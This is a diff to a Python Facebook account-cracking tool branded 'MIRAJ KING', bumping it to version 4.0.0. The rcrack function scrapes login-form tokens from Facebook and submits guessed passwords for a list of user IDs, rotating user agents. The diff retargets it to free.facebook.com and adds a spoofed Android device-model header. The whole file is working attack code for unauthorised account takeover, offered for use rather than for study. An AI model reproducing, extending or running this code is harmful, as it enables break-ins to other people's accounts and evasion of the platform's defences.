@@ -167,7 +167,7 @@ logo =("""
 \t\033[38;5;46m║\033[38;5;46m██  ██  ██    ██       ██      ██    ██  ██  ██  ██      \33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m██      ██    ██    ██ ███████  ██████    ████   ███████ \33[38;5;196m\033[34;1m\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m\33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mM+K\033[34;1mVERSION: 3.0.0\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mM+K\033[34;1mVERSION: 4.0.0\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m╚══════════════════════════════════╝
                \033[38;5;50m𝗗𝗔𝗧𝗔 & WIFI 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦💥💥
 \33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mMIRAJ KING\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
@@ -252,7 +252,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen5)
             bi = random.choice([P,M,K,B,U,O,N,H])
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -273,6 +273,7 @@ def rcrack(uid,pwx,tl):
     'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX3195"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"12.0.0"',
     'sec-fetch-dest': 'document',
